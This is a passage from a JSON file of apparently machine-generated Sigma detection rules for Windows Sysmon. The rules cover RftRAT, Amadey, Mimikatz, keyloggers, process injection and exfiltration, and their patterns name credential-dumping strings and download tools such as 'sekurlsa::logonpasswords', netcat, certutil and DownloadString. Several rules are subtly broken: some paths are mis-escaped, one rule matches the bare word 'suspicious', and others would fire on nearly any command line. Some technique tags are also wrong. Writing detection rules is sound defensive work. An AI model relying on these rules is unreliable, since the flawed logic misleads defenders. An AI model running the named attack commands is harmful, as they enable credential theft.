        "falsepositives": [
          "Legitimate application writing to %APPDATA%\\\\asc\\\\t1.pb (unlikely, as this path is highly specific)",
          "Malware analysis or replication in controlled environments"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.T1106",
          "malware.rat.rfrat"
        ],
        "ttp_id": "unknown",
        "technique_name": "Execution through API",
        "generation_method": "langchain",
        "id": "5542a5d8-5861-459b-87f3-82143d64b633"
      },
      {
        "title": "UAC Bypass via ICMLuaUtil",
        "description": "Detects UAC bypass attempts using ICMLuaUtil, a component associated with privilege escalation by leveraging COM interface manipulation to execute code with elevated privileges.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\ICMLuaUtil.exe",
            "CommandLine|contains": "LaunchAdvancedOptions"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system usage by authorized applications or administrative tools that invoke ICMLuaUtil for legitimate control panel operations"
        ],
        "level": "high",
        "tags": [
          "attack.privilege_escalation",
          "attack.t1548.002",
          "attack.t1088",
          "custom.detection-rule",
          "custom.windows-security"
        ],
        "ttp_id": "unknown",
        "technique_name": "UAC Bypass",
        "generation_method": "langchain",
        "id": "0d2ab478-514c-40e6-ad01-b4bf59e6a2ea"
      },
      {
        "title": "RftRAT Process Hollowing Detection",
        "description": "Detects RftRAT using process hollowing technique for defense evasion. Monitors for suspicious process creation patterns associated with known malware behavior, including hollowing indicators like suspended processes and later resume, along with command-line artifacts.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_rftRAT": {
            "CommandLine|contains": "RftRAT"
          },
          "selection_hollowing": {
            "CommandLine|contains": [
              "-CreateSuspended",
              "-WriteProcessMemory",
              "-ResumeThread"
            ],
            "Image|endswith": [
              "\\svchost.exe",
              "\\explorer.exe",
              "\\lsass.exe",
              "\\winlogon.exe"
            ],
            "ParentImage|endswith": [
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe"
            ]
          },
          "condition": "selection_rftRAT or selection_hollowing"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell to manipulate processes in controlled environments",
          "Software debugging or testing tools that simulate process injection"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.T1055",
          "malware.rat.rftRAT",
          "detection.rule.sigma"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Hollowing",
        "generation_method": "langchain",
        "id": "3a1692ca-2cfb-4cf3-85d2-d00e0ea7fb26"
      },
      {
        "title": "Mimikatz Process Execution Detected",
        "description": "Detects execution of mimikatz.exe which is commonly used for credential dumping and other credential access techniques.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\mimikatz.exe"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate use of Mimikatz by system administrators or security professionals during authorized penetration testing or red team exercises"
        ],
        "level": "critical",
        "tags": [
          "attack.credential_access",
          "attack.t1003",
          "custom.mimikatz",
          "custom.credential_dumping"
        ],
        "ttp_id": "unknown",
        "technique_name": "Credential Access",
        "generation_method": "langchain",
        "id": "0722aef6-06df-4817-9596-f75b416b5a69"
      },
      {
        "title": "C2 Server Communication via Suspicious Process",
        "description": "Detects potential command and control (C2) activity where a process communicates with a C&C server. Focuses on suspicious network connections initiated by common execution processes.",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe",
              "\\rundll32.exe"
            ],
            "DestinationIp": "*"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative scripts using command-line tools for remote management",
          "Automated patch management or monitoring tools initiating outbound connections",
          "Software updates initiated through scriptable interfaces"
        ],
        "level": "high",
        "tags": [
          "attack.t1071",
          "attack.t1571",
          "attack.command-and-control",
          "custom.windows",
          "custom.network",
          "custom.c2"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Control",
        "generation_method": "langchain",
        "id": "7848f6a4-c18e-455e-811b-4799694bf3e5"
      },
      {
        "title": "Remote Desktop Protocol Usage via RDP Wrapper",
        "description": "Detects potential misuse of Remote Desktop Protocol through the use of RDP Wrapper, which may indicate lateral movement activity. This rule focuses on process creation events associated with RDP-related behavior and known tooling.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_rdp_wrapper": {
            "Image|endswith": [
              "\\rdpwrap.dll",
              "\\RDPConf.exe",
              "\\RDPCheck.exe",
              "\\RDPWrap.ini"
            ],
            "CommandLine|contains": "3389"
          },
          "selection_port_usage": {
            "CommandLine|contains": [
              "3389",
              ":3389"
            ],
            "ParentImage|endswith": [
              "\\svchost.exe",
              "\\lsass.exe"
            ]
          },
          "condition": "selection_rdp_wrapper or selection_port_usage"
        },
        "falsepositives": [
          "Legitimate system administrators using RDP for remote management",
          "Use of RDP Wrapper for enabling RDP on non-Server Windows editions in lab or development environments"
        ],
        "level": "high",
        "tags": [
          "attack.t1021.001",
          "attack.lateral_movement",
          "custom.rdp",
          "custom.rdp_wrapper",
          "custom.lateral_movement"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Desktop Protocol",
        "generation_method": "langchain",
        "id": "da190372-d711-48b6-9654-57aa86e0ac5c"
      },
      {
        "title": "PowerShell Activity Detected via NLP Pattern Matching",
        "description": "Detects PowerShell activity using behavioral patterns and command-line arguments commonly associated with malicious use, based on NLP pattern matching.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-encodedcommand",
              "-exec",
              "-executionpolicy",
              "Invoke-Expression",
              "IEX",
              "DownloadString",
              "WebClient",
              "Invoke-WebRequest",
              "Invoke-RestMethod",
              "-WindowStyle hidden",
              "-noninteractive",
              "-nop",
              "-command"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell with encoded commands or restricted execution policies",
          "Software deployment or patch management tools invoking PowerShell remotely",
          "PowerShell-based monitoring or backup solutions",
          "User-initiated automation scripts with obfuscated commands"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059.001",
          "detection.emulation",
          "behavior.powershell.usage"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "909389df-4e4c-4ac0-9464-f35034c2e280"
      },
      {
        "title": "Amadey File and Directory Discovery Targeting South Korean Product Names",
        "description": "Detects Amadey malware performing file and directory discovery with a focus on searching for product names from South Korean companies.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ],
            "CommandLine|contains": [
              "dir",
              "ls",
              "findstr",
              "where",
              "Get-ChildItem",
              "gci",
              "ls",
              "dir",
              "find"
            ],
            "CommandLine|contains|all": [
              "\\",
              ".exe"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative scripts performing directory enumeration",
          "System maintenance tools scanning for executable files",
          "User-initiated file searches via command line"
        ],
        "level": "high",
        "tags": [
          "attack.discovery",
          "attack.T1083",
          "malware.amadey",
          "custom.windows",
          "custom.sokorean-targeting"
        ],
        "ttp_id": "unknown",
        "technique_name": "File and Directory Discovery",
        "generation_method": "langchain",
        "id": "63a236d8-cc30-46f9-b2b9-9421d1c34deb"
      },
      {
        "title": "Suspicious Rundll32 Execution via Uncommon Parameters",
        "description": "Detects suspicious use of rundll32.exe with command line parameters commonly associated with malicious code execution, such as script loading, WMI, or encoded commands. This behavior is often abused for defensive evasion.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_rundll32": {
            "Image|endswith": "\\rundll32.exe"
          },
          "selection_script_load": {
            "CommandLine|contains": [
              "javascript:",
              "vbscript:",
              "data: "
            ]
          },
          "selection_wmi_or_debug": {
            "CommandLine|contains": [
              "WMIC",
              "-debug",
              "/debug"
            ]
          },
          "selection_encoded": {
            "CommandLine|contains": [
              "-enc",
              "-e",
              "/e",
              "-b",
              "/b"
            ]
          },
          "selection_network": {
            "CommandLine|contains": [
              "http",
              "https",
              "\\\\"
            ]
          },
          "condition": "selection_rundll32 and (selection_script_load or selection_wmi_or_debug or selection_encoded or selection_network)"
        },
        "falsepositives": [
          "Legitimate use of rundll32.exe to load DLLs via standard Windows paths (e.g., C:\\\\Windows\\\\System32\\\\)",
          "Administrative scripts invoking rundll32 with HTTP for configuration",
          "Software installers using rundll32 in embedded contexts"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.T1218.011",
          "custom.windows",
          "custom.execution",
          "custom.rundll32"
        ],
        "ttp_id": "unknown",
        "technique_name": "Defensive Evasion",
        "generation_method": "langchain",
        "id": "d44fb879-7838-4256-a96f-c694804013c1"
      },
      {
        "title": "Amadey System Information Discovery via Command Line",
        "description": "Detects Amadey malware collecting system information from the infected system using command-line tools",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": [
              "systeminfo",
              "wmic",
              "query user",
              "net user",
              "ipconfig",
              "arp -a",
              "netstat -ano",
              "tasklist",
              "net view",
              "net localgroup",
              "whoami",
              "/all"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\cscript.exe",
              "\\wscript.exe"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system administration activities using command-line tools for troubleshooting or inventory",
          "Automated IT management scripts that gather system information",
          "Penetration testing or red team exercises"
        ],
        "level": "high",
        "tags": [
          "attack.discovery",
          "attack.T1087",
          "attack.T1012",
          "malware.command-and-control.amadey"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "generation_method": "langchain",
        "id": "32699665-201c-463f-8c23-75c66ea7735a"
      },
      {
        "title": "RftRAT File and Directory Discovery via Specific Path Names",
        "description": "Detects RftRAT using specific path names for saving data, indicative of file and directory discovery behavior.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe"
            ],
            "CommandLine|contains": "A1CCA2EC-C09F-D33C-4317-7F71F0E2A976_0"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative scripts using similar path patterns in command lines (unlikely but possible)",
          "Test or debugging scripts that reference UUID-like strings"
        ],
        "level": "high",
        "tags": [
          "attack.discovery",
          "attack.T1083",
          "malware.rat.rfrat"
        ],
        "ttp_id": "unknown",
        "technique_name": "File and Directory Discovery",
        "generation_method": "langchain",
        "id": "59a628f6-1001-4344-8f81-fac20ba91785"
      },
      {
        "title": "Mimikatz Execution for Credential Theft",
        "description": "Detects the execution of Mimikatz, a well-known tool used for credential dumping and privilege escalation, by identifying the process image name and common command-line arguments associated with credential access techniques.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_image": {
            "Image|endswith": "\\mimikatz.exe"
          },
          "selection_command": {
            "CommandLine|contains": "sekurlsa::logonpasswords"
          },
          "condition": "selection_image or (selection_command)"
        },
        "falsepositives": [
          "Legitimate administrative tools that may use similar command-line arguments for debugging or diagnostic purposes",
          "Security research or red teaming activities using Mimikatz in controlled environments",
          "Custom applications that inadvertently include strings similar to Mimikatz commands"
        ],
        "level": "high",
        "tags": [
          "attack.credential_access",
          "attack.t1003",
          "custom.mimikatz",
          "custom.credential_dumping"
        ],
        "ttp_id": "unknown",
        "technique_name": "Credential Access",
        "generation_method": "langchain",
        "id": "1e71a483-4cca-470e-a45f-bdac4c323aea"
      },
      {
        "title": "Keylogger Detection via Process Creation",
        "description": "Detects potential use of keylogger by identifying suspicious process creation events with command-line indicators associated with keystroke logging activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": [
              "keylogger",
              "-keylog",
              "--keylog",
              "logkeys",
              "keylog"
            ],
            "Image|endswith": [
              "\\logger.exe",
              "\\keylogger.exe",
              "\\logkeys.exe"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system monitoring tools that use 'keylog' in command line or process name",
          "Security software with 'keylogger' in path or arguments for testing purposes",
          "Developer tools or scripts that reference 'keylog' in benign context"
        ],
        "level": "high",
        "tags": [
          "attack.collection",
          "attack.t1074",
          "detection.keylogger",
          "windows.security"
        ],
        "ttp_id": "unknown",
        "technique_name": "Collection",
        "generation_method": "langchain",
        "id": "a94f1fd1-7b8f-4be7-828f-5ebb471ff6f2"
      },
      {
        "title": "RftRAT C&C Communication and Command Results",
        "description": "Detects RftRAT saving C&C communication and command results as part of System Information Discovery",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "\\AppData\\"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system scripting that uses echo to write data to files in AppData"
        ],
        "level": "high",
        "tags": [
          "attack.discovery",
          "attack.T1082",
          "malware.rat.rfrat"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "generation_method": "langchain",
        "id": "1b5c2c48-4085-442e-aaf3-975093d6b9c1"
      },
      {
        "title": "AutoIt Script Execution for Malicious Purposes",
        "description": "Detects execution of AutoIt scripts which can be used for malicious activities such as code execution and evasion. AutoIt is often abused to run scripts that perform actions without user interaction.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_image": {
            "Image|endswith": [
              "\\autoit3.exe",
              "\\AutoIt3_x64.exe"
            ]
          },
          "selection_command": {
            "CommandLine|contains": [
              "/ErrorStdOut",
              "-",
              "/in",
              ".a3x",
              ".au3"
            ]
          },
          "condition": "selection_image and selection_command"
        },
        "falsepositives": [
          "Legitimate use of AutoIt by system administrators or developers for automation tasks",
          "Deployment tools using AutoIt scripts in trusted environments"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.T1059",
          "custom.autoit",
          "custom.scripting",
          "custom.malicious-script"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "9fe70e44-cbd2-44c6-b174-daba6c227a07"
      },
      {
        "title": "RftRAT Injection into svchost.exe",
        "description": "Detects RftRAT injecting into svchost.exe process by monitoring process creation events with suspicious command-line characteristics.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\svchost.exe",
            "CommandLine|contains": "RftRAT"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system services spawning svchost.exe with unusual command lines (rare)",
          "Administrative scripts that reference RftRAT in command line for benign purposes (e.g., malware analysis)"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.T1055",
          "malware.rat",
          "custom.rftRAT"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "generation_method": "langchain",
        "id": "c8290f50-ad48-40ed-92dd-b4c6ee21cd4c"
      },
      {
        "title": "Create or Modify System Process via NLP Pattern Matching",
        "description": "Detected Create or Modify System Process activity via NLP pattern matching indicating potential persistence mechanism installation",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd_spawn": {
            "ParentImage|endswith": [
              "\\svchost.exe",
              "\\wininit.exe",
              "\\services.exe",
              "\\lsass.exe",
              "\\winlogon.exe"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe",
              "\\rundll32.exe",
              "\\regsvr32.exe"
            ],
            "CommandLine|contains": [
              "/c",
              "/k",
              "-c",
              "-EncodedCommand",
              "-enc",
              "CreateProcess",
              "ShellExecute"
            ]
          },
          "selection_susp_execution": {
            "Image|endswith": [
              "\\rundll32.exe",
              "\\regsvr32.exe",
              "\\mshta.exe",
              "\\wmic.exe"
            ],
            "CommandLine|contains": [
              ".dll",
              ".ocx",
              ".js",
              ".vbs",
              ".jse",
              ".vbe",
              "CreateProcess"
            ]
          },
          "condition": "selection_cmd_spawn or selection_susp_execution"
        },
        "falsepositives": [
          "Legitimate administrative scripts executed via command-line tools",
          "Scheduled tasks spawning scripts from system binaries",
          "Software deployment tools using rundll32 or regsvr32 for component registration",
          "System updates or patching processes"
        ],
        "level": "high",
        "tags": [
          "attack.t1136",
          "attack.t1501",
          "attack.t1053",
          "attack.t1204",
          "attack.g0005",
          "detection.rule.quality.high",
          "custom.persistence"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "id": "17721dcf-5c83-463e-803b-d2aacbbdd306"
      },
      {
        "title": "Detected Process Injection via NLP Pattern Matching",
        "description": "Detects potential process injection activity by identifying suspicious process creation patterns commonly associated with code injection techniques, such as reflective loading, APC injection, or hollowing, using behavioral indicators in command-line arguments and image paths.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_susp_image": {
            "Image|endswith": [
              "\\rundll32.exe",
              "\\regsvr32.exe",
              "\\mshta.exe",
              "\\certutil.exe",
              "\\cmstp.exe"
            ],
            "CommandLine|contains": [
              "\\",
              ":",
              "http",
              "base64",
              "-enc",
              "Invoke",
              "Reflective",
              "Load",
              "Shellcode",
              "VirtualAlloc",
              "WriteProcessMemory",
              "CreateRemoteThread"
            ]
          },
          "selection_susp_parent": {
            "ParentImage|endswith": [
              "\\explorer.exe",
              "\\winlogon.exe",
              "\\lsass.exe",
              "\\svchost.exe"
            ],
            "Image|endswith": [
              "\\dllhost.exe",
              "\\rundll32.exe",
              "\\regsvr32.exe"
            ]
          },
          "selection_high_risk_cmd": {
            "CommandLine|contains": [
              "/c",
              "cmd /k",
              "powershell -nop",
              "-exec bypass",
              "IEX",
              "Invoke-Expression",
              "DownloadString",
              "Net.WebClient",
              "reflection.assembly",
              "load_with_params"
            ]
          },
          "condition": "selection_susp_image or selection_susp_parent or selection_high_risk_cmd"
        },
        "falsepositives": [
          "Legitimate administrative scripts using certutil or regsvr32 for file download or registration",
          "Software deployment tools invoking rundll32 or regsvr32 with network-accessing scripts",
          "Internal monitoring tools executing commands via high-privilege processes"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1055",
          "detection.emulation",
          "behavioral.anomaly",
          "custom.process_injection"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "generation_method": "langchain",
        "id": "5009d9ce-d0de-4c64-9c85-99d44ef8a0fb"
      },
      {
        "title": "Infostealer Creation by RftRAT",
        "description": "Detects the creation of an infostealer by RftRAT as part of Data Staging tactic under Credential Access",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": [
              "Infostealer",
              "--stage",
              "-encode",
              "-compress",
              "pack"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate software packaging or compression tools using similar command-line arguments",
          "Administrative scripts performing data archiving or encoding",
          "Developer tools that use packing or encoding for legitimate purposes"
        ],
        "level": "high",
        "tags": [
          "attack.credential-access",
          "attack.t1074",
          "malware.infostealer",
          "custom.rftRAT"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Staging",
        "generation_method": "langchain",
        "id": "1ad9dd96-ef7e-4654-a821-769e7eaed40b"
      },
      {
        "title": "VMP Packed RftRAT Obfuscation",
        "description": "Detects RftRAT packed with VMProtect (VMP) through process creation with obfuscated command-line characteristics",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "VMP"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate software development or reverse engineering tools using VMProtect for code protection"
        ],
        "level": "high",
        "tags": [
          "attack.defense-evasion",
          "attack.T1027",
          "malware.rat",
          "custom.rftRAT",
          "custom.vmpacked"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "id": "ea5a7a6f-70f6-48a7-ae07-0ea93cbdf11f"
      },
      {
        "title": "RftRAT File Deletion via Command Line",
        "description": "Detects RftRAT using file deletion functionality by identifying suspicious command-line patterns associated with file deletion on Windows systems.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd_delete": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "0x06"
          },
          "selection_powershell_remove": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "0x06"
          },
          "selection_any_process_hex": {
            "CommandLine|contains": "delete"
          },
          "condition": "selection_cmd_delete or selection_powershell_remove or selection_any_process_hex"
        },
        "falsepositives": [
          "Legitimate system cleanup scripts using 'del' or 'Remove-Item' with hexadecimal arguments",
          "Administrative automation tasks involving file removal with encoded parameters"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.T1107",
          "malware.rat.rfrat"
        ],
        "ttp_id": "unknown",
        "technique_name": "File Deletion",
        "generation_method": "langchain",
        "id": "ecd70220-0a29-4f4d-b4b2-bc00c77e10a4"
      },
      {
        "title": "Application Layer Protocol Activity via NLP Pattern Matching",
        "description": "Detects Application Layer Protocol activity through behavioral patterns and command-line characteristics indicative of C2 communication, using NLP-based detection logic.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "/c"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": "-urlcache"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "AddJob"
          },
          "selection_curl": {
            "Image|endswith": "\\curl.exe",
            "CommandLine|contains": "http"
          },
          "selection_wget": {
            "Image|endswith": "\\wget.exe",
            "CommandLine|contains": "http"
          },
          "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin or selection_curl or selection_wget"
        },
        "falsepositives": [
          "Legitimate administrative use of command-line tools for downloading files",
          "Automated scripts using certutil or bitsadmin for caching updates",
          "Development or testing activities involving HTTP requests from command line"
        ],
        "level": "high",
        "tags": [
          "attack.t1071",
          "attack.c2",
          "detection.emulation",
          "behavioral.anomalous-cli-usage"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "generation_method": "langchain",
        "id": "ff75047f-eb96-488c-8977-385821cf303e"
      },
      {
        "title": "Exfiltration Over C2 Channel Detected via NLP Pattern Matching",
        "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching indicating potential data exfiltration through command-and-control infrastructure",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd_http": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": " /c "
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": "-decode"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "Transfer"
          },
          "selection_net_use": {
            "Image|endswith": "\\net.exe",
            "CommandLine|contains": "use"
          },
          "selection_ftp": {
            "Image|endswith": "\\ftp.exe",
            "CommandLine|contains": "open"
          },
          "condition": "selection_cmd_http or selection_powershell or selection_certutil or selection_bitsadmin or selection_net_use or selection_ftp"
        },
        "falsepositives": [
          "Legitimate administrative use of certutil, bitsadmin, or net commands",
          "Automated scripts using command-line utilities for maintenance",
          "Software deployment tools using network transfer utilities"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.T1041"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "generation_method": "langchain",
        "id": "d0c3b6d6-ef9c-402f-a4d1-b8451b2e8116"
      },
      {
        "title": "Exploit Public-Facing Application via NLP Pattern Matching",
        "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching indicating potential exploitation of a public-facing service such as web servers, databases, or other internet-accessible applications.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd_params": {
            "CommandLine|contains": [
              "/c",
              "&&",
              "|"
            ]
          },
          "selection_suspicious_keywords": {
            "CommandLine|contains": [
              "nc",
              "netcat",
              "powershell",
              "cmd",
              "wget",
              "curl",
              "tftp",
              "certutil",
              "regsvr32",
              "bitsadmin",
              "mshta",
              "cscript",
              "wscript"
            ]
          },
          "selection_parent_network_process": {
            "ParentImage|endswith": [
              "\\httpd.exe",
              "\nginx.exe",
              "\\mysqld.exe",
              "\tomcat.exe",
              "\\w3wp.exe",
              "\\svchost.exe"
            ]
          },
          "condition": "selection_cmd_params and selection_suspicious_keywords and selection_parent_network_process"
        },
        "falsepositives": [
          "Legitimate administrative scripts executed by system or application services",
          "Automated maintenance tasks initiated by web server processes",
          "Software updates or patching routines using command-line tools"
        ],
        "level": "high",
        "tags": [
          "attack.initial_access",
          "attack.T1190",
          "detection.emerging",
          "behavioral.anomaly"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "generation_method": "langchain",
        "id": "bb9e6b10-7f83-4521-9436-f2a3ba9e213a"
      },
      {
        "title": "OS Credential Dumping Detection via NLP Pattern Matching",
        "description": "Detected OS Credential Dumping activity via NLP pattern matching indicating potential credential access attempts using known malicious process behaviors.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "whoami"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Get-ADUser"
          },
          "selection_lsass_access": {
            "Image|endswith": "\\procdump.exe",
            "CommandLine|contains": "lsass"
          },
          "selection_mimikatz": {
            "CommandLine|contains": "sekurlsa::logonpasswords"
          },
          "condition": "selection_cmd or selection_powershell or selection_lsass_access or selection_mimikatz"
        },
        "falsepositives": [
          "Legitimate administrative scripts using 'whoami' or 'Get-ADUser'",
          "Authorized memory dumping tools used by system administrators",
          "Penetration testing activities with proper approval"
        ],
        "level": "high",
        "tags": [
          "attack.credential_access",
          "attack.t1003",
          "detection.rule.os_credential_dumping",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "OS Credential Dumping",
        "generation_method": "langchain",
        "id": "4b8fef8c-9f69-4528-ba9d-34a8fe7cf5fe"
      },
      {
        "title": "Archive Collected Data via Command-Line Archiving Tools",
        "description": "Detects archiving of collected data using command-line tools commonly abused by adversaries to bundle exfiltrated files. Matches on known archiving utilities and their common command-line arguments used in malicious contexts.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_archive_tools": {
            "Image|endswith": [
              "\\zip.exe",
              "\\rar.exe",
              "\\7z.exe",
              "\\tar.exe",
              "\\compress.exe"
            ],
            "CommandLine|contains": [
              "-r",
              "-a",
              "--recurse",
              "*.zip",
              "*.rar",
              "*.7z",
              "*.tar",
              "*.gz"
            ]
          },
          "selection_powershell_compress": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Compress-Archive",
              "-Path",
              "-DestinationPath",
              "\\AppData\\",
              "\\Local\\",
              "\\Temp\\"
            ]
          },
          "selection_wmic_archive": {
            "ParentImage|endswith": "\\wmic.exe",
            "Image|endswith": [
              "\\zip.exe",
              "\\7z.exe"
            ]
          },
          "condition": "selection_archive_tools or selection_powershell_compress or selection_wmic_archive"
        },
        "falsepositives": [
          "Legitimate administrative use of archiving tools for backup or deployment",
          "Automated scripts compressing logs or temporary data",
          "Software installers bundling files during setup"
        ],
        "level": "medium",
        "tags": [
          "attack.collection",
          "attack.T1560",
          "custom.windows",
          "custom.sysmon",
          "custom.command-line-archiving"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "e2074666-b304-43b2-84b6-7600530afc21"
      },
      {
        "title": "Detected Input Capture Activity via NLP Pattern Matching",
        "description": "Detects potential input capture activity by identifying suspicious processes or command-line patterns associated with capturing user input, such as keyboard logging or screen capture tools, using behavioral indicators and command-line artifacts.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system monitoring tools",
          "Administrative scripts using logging functions",
          "Developer testing of input handling",
          "Office documents spawning command-line utilities for legitimate automation"
        ],
        "level": "high",
        "tags": [
          "attack.credential_access",
          "attack.t1056",
          "detection.emulation",
          "behavioral.anomaly"
        ],
        "ttp_id": "unknown",
        "technique_name": "Input Capture",
